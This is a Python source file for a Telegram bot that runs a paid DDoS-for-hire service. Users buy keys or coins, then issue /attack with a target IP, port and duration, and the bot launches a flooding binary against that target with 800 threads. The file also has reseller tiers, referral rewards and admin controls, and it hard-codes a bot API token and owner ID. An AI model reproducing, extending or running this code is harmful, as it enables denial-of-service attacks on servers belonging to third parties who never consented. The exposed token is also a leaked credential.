import telebot
import subprocess
import threading
import time
import json
import os
import sys
import random
from datetime import datetime, timedelta
import requests

# Bot setup
API_TOKEN = '8094930692:AAGy-bnpYA0A1j6B3lRWol-GyfK9gtiMwCo'
GROUP_USERNAME = 'DDOS_SERVER69'
OWNER_ID = '1866961136'
bot = telebot.TeleBot(API_TOKEN)
DATA_FILE = 'bot_data.json'

# Helper function to escape MarkdownV2 reserved characters
def escape_markdown_v2(text):
    reserved_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    escaped = ''.join(f'\\{char}' if char in reserved_chars else char for char in str(text))
    return escaped

# Save and load data
def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

if os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'r') as f:
        data = json.load(f)
else:
    data = {'users': {}, 'keys': {}, 'banned': [], 'tutorials': [], 'logs': []}

if OWNER_ID not in data['users']:
    data['users'][OWNER_ID] = {
        'type': 'admin', 'plan': 'premium', 'limit': 600, 'expires': 0, 'coins': 1000, 'invited_by': None, 'group_invites': 0
    }
    save_data()

# Constants
COIN_PRICES = {'1h': 50, '1d': 100, '3d': 500, '7d': 700, '30d': 1500}
attacks = {}
BOT_CONFIG = {'attack_threads': 800, 'packet_size': 512}
SEP = escape_markdown_v2('----------------')  # Shortened separator

# Log function
def add_log(user_id, action):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace('-', '\-')
    data['logs'].append(f"[{timestamp}] User {escape_markdown_v2(user_id)}: {escape_markdown_v2(action)}")
    if len(data['logs']) > 100:
        data['logs'] = data['logs'][-100:]
    save_data()

# Attack execution
def run_attack(user_id, ip, port, duration, chat_id):
    try:
        process = subprocess.Popen(['./Rohan', ip, str(port), str(duration), str(BOT_CONFIG['packet_size']), str(BOT_CONFIG['attack_threads'])])
        attacks[user_id] = {'process': process, 'chat_id': chat_id}
        process.wait()
        bot.send_message(chat_id, f"✅ Attack Done\n{SEP}\nTarget: {escape_markdown_v2(ip)}:{port}\nTime: {duration}s", parse_mode='MarkdownV2')
    except FileNotFoundError:
        bot.send_message(chat_id, "❌ Error: Rohan binary missing", parse_mode='MarkdownV2')
    finally:
        if user_id in attacks:
            del attacks[user_id]

# Commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.from_user.id)
    args = message.text.split()
    referrer_id = args[1][4:] if len(args) > 1 and args[1].startswith('ref_') else None

    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Banned", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        data['users'][user_id] = {'type': 'user', 'plan': 'free', 'limit': 120, 'expires': 0, 'coins': 0, 'invited_by': referrer_id, 'group_invites': 0}
        if referrer_id and referrer_id in data['users'] and referrer_id != user_id and message.chat.type in ['group', 'supergroup']:
            referrer = data['users'][referrer_id]
            referrer['group_invites'] += 1
            referrer['coins'] += 10
            bot.send_message(referrer_id, f"🎉 +10 coins for referral {escape_markdown_v2(user_id)}", parse_mode='MarkdownV2')
        save_data()
    bot.reply_to(message, f"🌟 Welcome\n{SEP}\nUse /help for commands", parse_mode='MarkdownV2')

@bot.message_handler(commands=['help'])
def send_help(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Banned", parse_mode='MarkdownV2')
        return
    user_type = data['users'].get(user_id, {}).get('type', 'user')
    is_owner = user_id == OWNER_ID

    help_text = f"🌟 Commands\n{SEP}\n"
    if user_type in ['user', 'reseller', 'admin'] or is_owner:
        help_text += (
            "👤 User:\n"
            "`/start` \\- Begin\n"
            "`/myinfo` \\- Stats\n"
            "`/attack [IP] [PORT] [TIME]` \\- Attack\n"
            "`/stop` \\- Stop attack\n"
            "`/redeem [KEY]` \\- Redeem key\n"
            "`/plan` \\- Plans\n"
            "`/coins` \\- Coin balance\n"
            "`/buykey [DURATION]` \\- Buy key\n"
            "`/spend [COINS]` \\- Boost limit\n"
            "`/invite` \\- Referral link\n"
            "`/leaderboard` \\- Top inviters\n"
            "`/tutorial` \\- Videos\n"
            "`/help` \\- This list\n"
            f"{SEP}\n"
        )
    if user_type == 'reseller' or (user_type == 'admin' or is_owner):
        help_text += "🔧 Reseller:\n`/buykey [DURATION] [LIMIT]` \\- Custom key\n" + f"{SEP}\n"
    if user_type == 'admin' or is_owner:
        help_text += (
            "🔒 Admin:\n"
            "`/gen [KEY] [DURATION] [USES]` \\- New key\n"
            "`/allkey` \\- List keys\n"
            "`/block [KEY]` \\- Block key\n"
            "`/add [TYPE] [USER_ID] [DURATION] [COINS]` \\- Add user\n"
            "`/remove [USER_ID]` \\- Remove user\n"
            "`/ban [USER_ID]` \\- Ban\n"
            "`/unban [USER_ID]` \\- Unban\n"
            "`/users` \\- User list\n"
            "`/limit [USER_ID] [SECONDS]` \\- Set limit\n"
            "`/broadcast [MESSAGE]` \\- Announce\n"
            "`/botupdate` \\- Status\n"
            "`/addtutorial [LINK]` \\- Add video\n"
            "`/logs` \\- Logs\n"
            "`/clearlogs` \\- Clear logs\n"
            f"{SEP}\n"
        )
    if is_owner:
        help_text += "👑 Owner:\n`/terminal [CMD] [ARGS]` \\- Terminal\n`/shutdown` \\- Stop bot\n" + f"{SEP}\n"
    help_text += "📲 @Rohan2349"
    bot.reply_to(message, help_text, parse_mode='MarkdownV2')

@bot.message_handler(commands=['invite'])
def send_invite(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Banned", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        bot.reply_to(message, "⚠️ Use /start first", parse_mode='MarkdownV2')
        return
    group_link = f"t\\.me/{GROUP_USERNAME}?start=ref_{escape_markdown_v2(user_id)}"
    bot.reply_to(message, f"📩 Invite\n{SEP}\nLink: {group_link}\nReward: 10 coins/invite", parse_mode='MarkdownV2')

@bot.message_handler(commands=['leaderboard'])
def show_leaderboard(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Banned", parse_mode='MarkdownV2')
        return
    leaderboard = sorted(data['users'].items(), key=lambda x: (x[1]['group_invites'], x[1]['coins']), reverse=True)[:5]  # Reduced to 5
    if not leaderboard:
        bot.reply_to(message, "🏆 Leaderboard\nNo data yet", parse_mode='MarkdownV2')
        return
    msg = f"🏆 Top Inviters\n{SEP}\n"
    for i, (uid, user) in enumerate(leaderboard, 1):
        msg += f"{i}\\. {escape_markdown_v2(uid)}: {user['group_invites']} invites, {user['coins']} coins\n"
    bot.reply_to(message, msg, parse_mode='MarkdownV2')

@bot.message_handler(commands=['shutdown'])
def shutdown_bot(message):
    user_id = str(message.from_user.id)
    if user_id != OWNER_ID:
        bot.reply_to(message, "🔒 Owner only", parse_mode='MarkdownV2')
        return
    bot.reply_to(message, f"🛑 Shutting down\n{SEP}\nBot stopping...", parse_mode='MarkdownV2')
    save_data()
    bot.stop_polling()
    sys.exit(0)

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Banned", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        data['users'][user_id] = {'type': 'user', 'plan': 'free', 'limit': 120, 'expires': 0, 'coins': 0, 'invited_by': None, 'group_invites': 0}
        save_data()
    user = data['users'][user_id]
    expires = "Never" if user['expires'] == 0 else datetime.fromtimestamp(user['expires']).strftime('%Y-%m-%d %H:%M:%S').replace('-', '\-')
    bot.reply_to(message, f"📊 Info\n{SEP}\nID: {escape_markdown_v2(user_id)}\nType: {user['type']}\nPlan: {user['plan']}\nLimit: {user['limit']}s\nExpires: {expires}\nCoins: {user['coins']}", parse_mode='MarkdownV2')

@bot.message_handler(commands=['coins'])
def check_coins(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Banned", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        data['users'][user_id] = {'type': 'user', 'plan': 'free', 'limit': 120, 'expires': 0, 'coins': 0, 'invited_by': None, 'group_invites': 0}
        save_data()
    coins = data['users'][user_id]['coins']
    bot.reply_to(message, f"💰 Coins\n{SEP}\nTotal: {coins}", parse_mode='MarkdownV2')

@bot.message_handler(commands=['buykey'])
def buy_key(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Banned", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        bot.reply_to(message, "⚠️ Use /start first", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    is_reseller = data['users'][user_id]['type'] == 'reseller'
    if (is_reseller and len(args) != 3) or (not is_reseller and len(args) != 2):
        bot.reply_to(message, f"📋 Usage\n{SEP}\n{'`/buykey [DURATION] [LIMIT]`' if is_reseller else '`/buykey [DURATION]`'}", parse_mode='MarkdownV2')
        return
    duration_str = args[1]
    if duration_str not in COIN_PRICES:
        bot.reply_to(message, f"❌ Invalid duration\n{SEP}\nOptions: 1h, 1d, 3d, 7d, 30d", parse_mode='MarkdownV2')
        return
    user = data['users'][user_id]
    if is_reseller:
        try:
            attack_limit = int(args[2])
            if not 100 <= attack_limit <= 600:
                bot.reply_to(message, f"❌ Limit must be 100\\-600s", parse_mode='MarkdownV2')
                return
            cost = COIN_PRICES[duration_str] + (attack_limit - 100) // 5
        except ValueError:
            bot.reply_to(message, "❌ Limit must be a number", parse_mode='MarkdownV2')
            return
    else:
        cost = COIN_PRICES[duration_str]
        attack_limit = 200
    if user['coins'] < cost:
        bot.reply_to(message, f"💸 Need {cost} coins, have {user['coins']}", parse_mode='MarkdownV2')
        return
    key_code = f"Rohan{random.randint(1000, 9999)}"
    duration = {'1h': 3600, '1d': 86400, '3d': 259200, '7d': 604800, '30d': 2592000}[duration_str]
    data['keys'][key_code] = {'duration': duration, 'uses': 1, 'active': True, 'created': time.time(), 'attack_limit': attack_limit}
    user['coins'] -= cost
    add_log(user_id, f"Bought key {key_code} for {duration_str}")
    save_data()
    bot.reply_to(message, f"🛒 Key\n{SEP}\nKey: {key_code}\nLimit: {attack_limit}s\nCost: {cost} coins\nUse: `/redeem {key_code}`", parse_mode='MarkdownV2')

@bot.message_handler(commands=['attack'])
def start_attack(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Banned", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        bot.reply_to(message, "⚠️ Use /start first", parse_mode='MarkdownV2')
        return
    user = data['users'][user_id]
    if user['plan'] == 'free':
        bot.reply_to(message, "📩 Upgrade @Rohan2349", parse_mode='MarkdownV2')
        return
    if user_id in attacks:
        bot.reply_to(message, "⚠️ Attack running", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/attack [IP] [PORT] [TIME]`", parse_mode='MarkdownV2')
        return
    ip, port, time_str = args[1], args[2], args[3]
    try:
        duration = int(time_str)
        port = int(port)
        if duration > user['limit']:
            bot.reply_to(message, f"⏱️ Max {user['limit']}s", parse_mode='MarkdownV2')
            return
        if user['expires'] and time.time() > user['expires']:
            bot.reply_to(message, "⌛ Expired", parse_mode='MarkdownV2')
            return
        bot.reply_to(message, f"💥 Started\n{SEP}\nTarget: {escape_markdown_v2(ip)}:{port}\nTime: {duration}s", parse_mode='MarkdownV2')
        add_log(user_id, f"Attack on {ip}:{port} for {duration}s")
        threading.Thread(target=run_attack, args=(user_id, ip, port, duration, chat_id)).start()
    except ValueError:
        bot.reply_to(message, "❌ Port/time must be numbers", parse_mode='MarkdownV2')

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in attacks:
        bot.reply_to(message, "⚠️ No attack", parse_mode='MarkdownV2')
        return
    attacks[user_id]['process'].terminate()
    del attacks[user_id]
    bot.reply_to(message, f"⛔ Stopped\n{SEP}\nAttack ended", parse_mode='MarkdownV2')
    add_log(user_id, "Stopped attack")

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Banned", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/redeem [KEY]`", parse_mode='MarkdownV2')
        return
    key = args[1]
    if key not in data['keys'] or not data['keys'][key]['active'] or data['keys'][key]['uses'] <= 0:
        bot.reply_to(message, "❌ Invalid key", parse_mode='MarkdownV2')
        return
    key_data = data['keys'][key]
    limit = key_data.get('attack_limit', 600)
    data['users'][user_id] = {
        'type': 'user', 'plan': 'premium', 'limit': limit,
        'expires': time.time() + key_data['duration'] if key_data['duration'] != 0 else 0,
        'coins': data['users'][user_id].get('coins', 0), 'invited_by': data['users'][user_id].get('invited_by', None),
        'group_invites': data['users'][user_id].get('group_invites', 0)
    }
    key_data['uses'] -= 1
    if key_data['uses'] == 0:
        key_data['active'] = False
    add_log(user_id, f"Redeemed {key}")
    save_data()
    bot.reply_to(message, f"🔑 Redeemed\n{SEP}\nLimit: {limit}s", parse_mode='MarkdownV2')

@bot.message_handler(commands=['plan'])
def show_plans(message):
    bot.reply_to(message, f"📋 Plans\n{SEP}\nFree: 120s\nPremium: Up to 600s\nTrial: 1h=50c, 1d=100c, 7d=700c", parse_mode='MarkdownV2')

@bot.message_handler(commands=['spend'])
def spend_coins(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Banned", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        bot.reply_to(message, "⚠️ Use /start first", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/spend [COINS]`", parse_mode='MarkdownV2')
        return
    try:
        coins = int(args[1])
        if coins <= 0:
            bot.reply_to(message, "❌ Positive number only", parse_mode='MarkdownV2')
            return
        user = data['users'][user_id]
        if coins > user['coins']:
            bot.reply_to(message, f"💸 Have {user['coins']} coins", parse_mode='MarkdownV2')
            return
        extra_seconds = (coins // 10) * 20
        new_limit = min(user['limit'] + extra_seconds, 200)
        if new_limit == user['limit']:
            bot.reply_to(message, "⚠️ Max 200s", parse_mode='MarkdownV2')
            return
        user['coins'] -= coins
        user['limit'] = new_limit
        add_log(user_id, f"Spent {coins} coins for {new_limit}s limit")
        save_data()
        bot.reply_to(message, f"⬆️ Upgraded\n{SEP}\nNew limit: {new_limit}s", parse_mode='MarkdownV2')
    except ValueError:
        bot.reply_to(message, "❌ Number required", parse_mode='MarkdownV2')

# Admin commands
def is_admin(user_id):
    return str(user_id) in data['users'] and data['users'][str(user_id)]['type'] == 'admin'

@bot.message_handler(commands=['gen'])
def generate_key(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/gen [KEY] [DURATION] [USES]`", parse_mode='MarkdownV2')
        return
    key, duration_str, uses = args[1], args[2], int(args[3])
    duration = 0 if duration_str == 'permanent' else int(duration_str[:-1]) * (86400 if duration_str.endswith('d') else 3600 if duration_str.endswith('h') else 1)
    data['keys'][key] = {'duration': duration, 'uses': uses, 'active': True, 'created': time.time()}
    add_log(user_id, f"Generated {key}")
    save_data()
    bot.reply_to(message, f"🗝️ Key\n{SEP}\nKey: {key}\nUses: {uses}", parse_mode='MarkdownV2')

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/add [TYPE] [USER_ID] [DURATION] [COINS]`", parse_mode='MarkdownV2')
        return
    type_, target_id, duration_str = args[1], args[2], args[3]
    coins = int(args[4]) if len(args) > 4 else 500
    if type_ not in ['user', 'admin', 'reseller']:
        bot.reply_to(message, "❌ Type: user, admin, reseller", parse_mode='MarkdownV2')
        return
    duration = 0 if duration_str == 'permanent' else int(duration_str[:-1]) * (86400 if duration_str.endswith('d') else 3600 if duration_str.endswith('h') else 1)
    data['users'][target_id] = {
        'type': type_, 'plan': 'premium' if type_ in ['admin', 'reseller'] else 'free',
        'limit': 600 if type_ in ['admin', 'reseller'] else 120, 'expires': time.time() + duration if duration else 0,
        'coins': coins, 'invited_by': None, 'group_invites': 0
    }
    add_log(user_id, f"Added {target_id}")
    save_data()
    bot.reply_to(message, f"➕ Added\n{SEP}\nID: {escape_markdown_v2(target_id)}\nType: {type_}", parse_mode='MarkdownV2')

@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    if not data['users']:
        bot.reply_to(message, "👥 No users", parse_mode='MarkdownV2')
        return
    msg = f"👥 Users\n{SEP}\n"
    for uid, user in list(data['users'].items())[:5]:  # Limit to 5 users
        expires = "Never" if user['expires'] == 0 else datetime.fromtimestamp(user['expires']).strftime('%Y-%m-%d').replace('-', '\-')
        msg += f"ID: {escape_markdown_v2(uid)}\nType: {user['type']}\nLimit: {user['limit']}s\nExpires: {expires}\n"
    bot.reply_to(message, msg, parse_mode='MarkdownV2')

@bot.message_handler(commands=['limit'])
def set_limit(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/limit [USER_ID] [SECONDS]`", parse_mode='MarkdownV2')
        return
    target_id, limit = args[1], args[2]
    try:
        limit = int(limit)
        if limit < 0 or target_id not in data['users']:
            bot.reply_to(message, "❌ Invalid input", parse_mode='MarkdownV2')
            return
        data['users'][target_id]['limit'] = limit
        add_log(user_id, f"Set limit for {target_id} to {limit}s")
        save_data()
        bot.reply_to(message, f"⏱️ Updated\n{SEP}\nID: {escape_markdown_v2(target_id)}\nLimit: {limit}s", parse_mode='MarkdownV2')
    except ValueError:
        bot.reply_to(message, "❌ Number required", parse_mode='MarkdownV2')

@bot.message_handler(commands=['ban'])
def ban_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/ban [USER_ID]`", parse_mode='MarkdownV2')
        return
    target_id = args[1]
    if target_id not in data['users'] or target_id in data['banned']:
        bot.reply_to(message, "❌ Invalid or already banned", parse_mode='MarkdownV2')
        return
    data['banned'].append(target_id)
    add_log(user_id, f"Banned {target_id}")
    save_data()
    bot.reply_to(message, f"⛔ Banned\n{SEP}\nID: {escape_markdown_v2(target_id)}", parse_mode='MarkdownV2')

@bot.message_handler(commands=['unban'])
def unban_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/unban [USER_ID]`", parse_mode='MarkdownV2')
        return
    target_id = args[1]
    if target_id not in data['banned']:
        bot.reply_to(message, "⚠️ Not banned", parse_mode='MarkdownV2')
        return
    data['banned'].remove(target_id)
    add_log(user_id, f"Unbanned {target_id}")
    save_data()
    bot.reply_to(message, f"✅ Unbanned\n{SEP}\nID: {escape_markdown_v2(target_id)}", parse_mode='MarkdownV2')

@bot.message_handler(commands=['allkey'])
def list_keys(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    if not data['keys']:
        bot.reply_to(message, "🔑 No keys", parse_mode='MarkdownV2')
        return
    msg = f"🔑 Keys\n{SEP}\n"
    for key, key_data in list(data['keys'].items())[:5]:  # Limit to 5 keys
        msg += f"Key: {key}\nUses: {key_data['uses']}\nActive: {key_data['active']}\n"
    bot.reply_to(message, msg, parse_mode='MarkdownV2')

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/block [KEY]`", parse_mode='MarkdownV2')
        return
    key = args[1]
    if key not in data['keys'] or not data['keys'][key]['active']:
        bot.reply_to(message, "❌ Invalid or inactive", parse_mode='MarkdownV2')
        return
    data['keys'][key]['active'] = False
    add_log(user_id, f"Blocked {key}")
    save_data()
    bot.reply_to(message, f"🚫 Blocked\n{SEP}\nKey: {key}", parse_mode='MarkdownV2')

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/remove [USER_ID]`", parse_mode='MarkdownV2')
        return
    target_id = args[1]
    if target_id not in data['users'] or target_id == OWNER_ID:
        bot.reply_to(message, "❌ Invalid or owner", parse_mode='MarkdownV2')
        return
    del data['users'][target_id]
    if target_id in data['banned']:
        data['banned'].remove(target_id)
    add_log(user_id, f"Removed {target_id}")
    save_data()
    bot.reply_to(message, f"➖ Removed\n{SEP}\nID: {escape_markdown_v2(target_id)}", parse_mode='MarkdownV2')

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/broadcast [MESSAGE]`", parse_mode='MarkdownV2')
        return
    text = args[1]
    success, fail = 0, 0
    for uid in data['users'].keys():
        try:
            bot.send_message(uid, f"📢 Broadcast\n{SEP}\n{escape_markdown_v2(text)}", parse_mode='MarkdownV2')
            success += 1
        except Exception:
            fail += 1
    bot.reply_to(message, f"📢 Done\n{SEP}\nSent: {success}\nFailed: {fail}", parse_mode='MarkdownV2')
    add_log(user_id, f"Broadcast to {success} users")

@bot.message_handler(commands=['botupdate'])
def bot_update(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    current_time = time.time()
    removed_users = sum(1 for uid, user in list(data['users'].items()) if user['expires'] != 0 and user['expires'] < current_time)
    for uid in [u for u, user in data['users'].items() if user['expires'] != 0 and user['expires'] < current_time]:
        del data['users'][uid]
        if uid in data['banned']:
            data['banned'].remove(uid)
    removed_keys = sum(1 for key, k in list(data['keys'].items()) if k['uses'] <= 0 or (k['duration'] != 0 and k['created'] + k['duration'] < current_time))
    for key in [k for k, kd in data['keys'].items() if kd['uses'] <= 0 or (kd['duration'] != 0 and kd['created'] + kd['duration'] < current_time)]:
        del data['keys'][key]
    save_data()
    bot.reply_to(message, f"🔄 Update\n{SEP}\nUsers: {len(data['users'])}\nKeys: {len(data['keys'])}\nAttacks: {len(attacks)}", parse_mode='MarkdownV2')
    add_log(user_id, "Bot updated")

@bot.message_handler(commands=['terminal'])
def terminal_command(message):
    user_id = str(message.from_user.id)
    if user_id != OWNER_ID:
        bot.reply_to(message, "🔒 Owner only", parse_mode='MarkdownV2')
        return
    args = message.text.split(maxsplit=2)
    if len(args) < 2:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/terminal [CMD] [ARGS]`", parse_mode='MarkdownV2')
        return
    subcmd = args[1].lower()
    if subcmd == 'set' and len(args) == 3:
        key, value = args[2].split(maxsplit=1)
        try:
            value = int(value)
            if key == 'thread':
                BOT_CONFIG['attack_threads'] = value
                bot.reply_to(message, f"⚙️ Set\n{SEP}\nThreads: {value}", parse_mode='MarkdownV2')
            elif key == 'packet size':
                BOT_CONFIG['packet_size'] = value
                bot.reply_to(message, f"⚙️ Set\n{SEP}\nPacket: {value}", parse_mode='MarkdownV2')
            else:
                bot.reply_to(message, "❌ Use: thread, packet size", parse_mode='MarkdownV2')
            add_log(user_id, f"Set {key} to {value}")
        except ValueError:
            bot.reply_to(message, "❌ Number required", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, "❌ Invalid cmd", parse_mode='MarkdownV2')

@bot.message_handler(commands=['tutorial'])
def send_tutorial(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Banned", parse_mode='MarkdownV2')
        return
    if not data['tutorials']:
        bot.reply_to(message, "🎥 No tutorials", parse_mode='MarkdownV2')
        return
    msg = f"🎥 Tutorials\n{SEP}\n"
    for i, link in enumerate(data['tutorials'][:3], 1):  # Limit to 3
        msg += f"{i}\\. {escape_markdown_v2(link)}\n"
    bot.reply_to(message, msg, parse_mode='MarkdownV2')

@bot.message_handler(commands=['addtutorial'])
def add_tutorial(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, f"📋 Usage\n{SEP}\n`/addtutorial [LINK]`", parse_mode='MarkdownV2')
        return
    link = args[1]
    if link not in data['tutorials']:
        data['tutorials'].append(link)
        add_log(user_id, f"Added tutorial {link}")
        save_data()
        bot.reply_to(message, f"🎬 Added\n{SEP}\nLink: {escape_markdown_v2(link)}", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, "⚠️ Duplicate", parse_mode='MarkdownV2')

@bot.message_handler(commands=['logs'])
def show_logs(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    if not data['logs']:
        bot.reply_to(message, "📜 No logs", parse_mode='MarkdownV2')
        return
    msg = f"📜 Logs\n{SEP}\n" + "\n".join(data['logs'][-5:])  # Last 5 logs
    bot.reply_to(message, msg, parse_mode='MarkdownV2')

@bot.message_handler(commands=['clearlogs'])
def clear_logs(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Admin only", parse_mode='MarkdownV2')
        return
    data['logs'] = []
    add_log(user_id, "Cleared logs")
    save_data()
    bot.reply_to(message, f"🗑️ Cleared\n{SEP}\nLogs reset", parse_mode='MarkdownV2')

# Run bot
if __name__ == "__main__":
    while True:
        try:
            bot.polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)